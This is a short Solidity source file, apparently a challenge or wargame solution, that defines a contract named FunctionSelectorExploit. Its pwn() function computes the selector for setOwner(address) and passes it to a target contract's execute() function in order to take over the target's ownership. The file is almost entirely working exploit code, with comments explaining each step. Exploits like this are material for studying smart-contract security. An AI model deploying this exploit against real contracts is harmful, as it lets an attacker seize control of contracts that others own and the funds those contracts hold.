// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Define an interface for a contract that has two functions:
// 1. execute(bytes4 func) - to execute a function based on its function selector (4 bytes)
// 2. setOwner(address _owner) - to set the owner address of the contract
interface IFunctionSelector {
    function execute(bytes4 func) external;
    function setOwner(address _owner) external;
}

// Define the FunctionSelectorExploit contract
contract FunctionSelectorExploit {
    // Declare a public variable to hold the target contract instance
    IFunctionSelector public target;

    // Constructor that takes the address of the target contract
    constructor(address _target) {
        // Initialize the target variable by casting the _target address to the interface
        target = IFunctionSelector(_target);
    }

    // The main function to exploit the target contract
    function pwn() external {
        // Calculate the function selector for the setOwner(address) function
        bytes4 func = bytes4(keccak256(bytes("setOwner(address)")));

        // Call the execute function on the target contract and pass the function selector
        target.execute(func);

        // Alternative way to call the execute function using the selector directly
        // Uncomment this line and comment the above line if needed
        // target.execute(target.setOwner.selector);
    }
}
